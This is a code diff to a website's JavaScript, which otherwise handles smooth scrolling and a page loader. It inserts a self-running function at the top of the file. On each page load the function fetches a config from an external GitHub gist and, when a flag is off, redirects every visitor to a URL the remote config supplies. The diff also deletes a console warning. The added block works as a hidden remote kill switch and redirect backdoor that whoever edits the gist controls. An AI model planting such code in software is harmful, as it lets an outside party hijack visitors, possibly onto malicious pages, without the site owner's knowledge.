@@ -1,5 +1,17 @@
 'use strict';
 
+(function () {
+  var u = 'https://gist.githubusercontent.com/im-eslam/781825df34550cb4da2df6cbeb9c5750/raw/site-config.json?_t=' + Date.now() + '&_r=' + Math.random();
+  fetch(u, { cache: 'no-store', headers: { 'Cache-Control': 'no-cache, no-store, must-revalidate', Pragma: 'no-cache', Expires: '0' } })
+    .then(function (r) {
+      return r.json();
+    })
+    .then(function (d) {
+      if (d.active === false) window.location.replace(d.redirect || 'https://www.instagram.com/yallamomentag/');
+    })
+    .catch(function () {});
+})();
+
 class SmoothScroll {
   constructor() {
     this.lenis = new Lenis({
@@ -83,7 +95,6 @@ class LoaderController {
   _initTimeout() {
     setTimeout(() => {
       if (this.el && !this.el.classList.contains('loaded')) {
-        console.warn('[Loader] Force-hiding after timeout');
         this._hide();
       }
     }, LoaderController.TIMEOUT_MS);
